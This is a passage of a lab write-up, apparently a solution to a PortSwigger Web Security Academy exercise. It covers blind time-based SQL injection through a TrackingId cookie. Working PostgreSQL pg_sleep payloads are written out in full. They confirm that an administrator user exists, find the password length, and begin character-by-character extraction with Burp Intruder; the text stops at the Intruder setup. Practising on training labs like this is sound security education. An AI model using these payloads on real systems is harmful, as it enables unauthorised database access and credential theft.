![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/201497d3-fc39-442f-aacd-c8095c2d8d3e)

## Solution

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/3d1a55d4-5856-49dc-8faf-95f018c5a8ab)

Modify the TrackingId cookie, changing it to:
> TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/daf69c2f-0c84-49b1-b2fc-f2c8f1b07855)
Verify that the application takes 10 seconds to respond.

Now change it to:
> TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/b88d5a9c-470b-4110-9a17-5da6b971d204)
Verify that the application responds immediately with no time delay. This demonstrates how we can test a single boolean condition and infer the result.

Now change it to:
> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/20b79dbd-317e-4167-9449-d65c4bd85a19)
Verify that the condition is true, confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/22e14cef-90d4-4ad5-b0d8-4115e2c17d2d)
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:
> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/3216fb5e-41f7-4c40-b445-0cd39ed4d6c7)
Then send:
> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/f2345c57-a11e-4d4e-a3f4-19d5f403afaa)
And so on. We can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), we have determined the length of the password, which is in fact 20 characters long.

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

In the Positions tab of Burp Intruder, change the value of the cookie to:
> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/defbb0c6-ce46-4359-a7c8-e24655e8d829)
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/6dbbc971-ff3d-4ad6-8751-6b91a94d1590)
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a72f91d7-2e8f-4168-9e99-7ac1095396e5)
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/6b6c94d3-cb4f-4828-9d01-b6412a15d425)
![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/f6efa164-9f18-4cd6-b70c-66a31a7d3f70)

